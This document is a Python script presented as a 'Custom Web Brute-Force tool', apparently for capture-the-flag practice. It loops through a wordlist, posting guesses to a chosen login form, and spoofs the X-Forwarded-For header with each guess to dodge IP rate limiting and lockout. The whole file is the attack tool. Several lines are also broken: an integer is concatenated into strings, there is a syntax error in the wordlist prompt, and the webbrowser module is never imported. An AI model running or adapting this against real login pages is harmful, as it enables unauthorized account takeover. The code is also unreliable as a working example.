#!/usr/bin/python3
print("""+-------------------------------------------------------+
|                     CWBF by eblue3                    |
+---------------------------+---------------------------+
|      __________________   |                           |
|  ==c(______(o(______(_()  | |\"\"\"\"\"\"\"\"\"\"\"\"|======[***  |
|             )=\\           | |  EXPLOIT   \            |
|            // \\\          | |_____________\_______    |
|           //   \\\         | |==[msf >]============\   |
|          //     \\\        | |______________________\  |
|         // RECON \\\       | \(@)(@)(@)(@)(@)(@)(@)/   |
|        //         \\\      |  *********************    |
+---------------------------+---------------------------+
|      o O o                |        \'\/\/\/\'\/         |
|              o O          |         )======(          |
|                 o         |       .'  LOOT  '.        |
| |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
| |    PAYLOAD     |\"\"\___, |     /    (_||_     \      |
| |________________|__|)__| |    |     __||_)     |     |
| |(@)(@)\"\"\"**|(@)(@)**|(@) |    \"       ||       \"     |
|  = = = = = = = = = = = =  |     '--------------'      |
+---------------------------+---------------------------+
Custom Web Brute-Force tool. Happy hacking!""")
import re
import requests
import os
import urllib.request

def open_resources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = input("Input URL: http(s)://...")
login_page = input("Login link (/.../<login>): ")
login_url = host+login_page

username = input("Username: ")
customwords = os.listdir("/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/CustomWords")
count = 0
for file in customwords:
    print("Words["+count+"]: "+file)
    count += 1
while True:
    words = int(input("Choose your wordlist (0-"+count"): "))
    try:
        customwords[words]
    except IndexError:
        print("Wrong Number.")
    except NameError:
        print("Wrong Input.")
    else:
        break
wordpath = "/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/CustomWords/"+customwords[words]
wordlist = open_resources(wordpath)
print("Opening Browser for viewing source...")
sourcelink = "view-source:"+login_url
webbrowser.open_new_tab(sourcelink)

userform = str(input("Input the Username form, usually be: <input class=\"form-control\" type=\"text\" name=\"...\" : "))
passform = str(input("Input the Password form, usually be: <input type=\"password\" class=\"form-control\" name=\"...\" : "))

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        userform: username,
        passform: password,
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if login_page in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
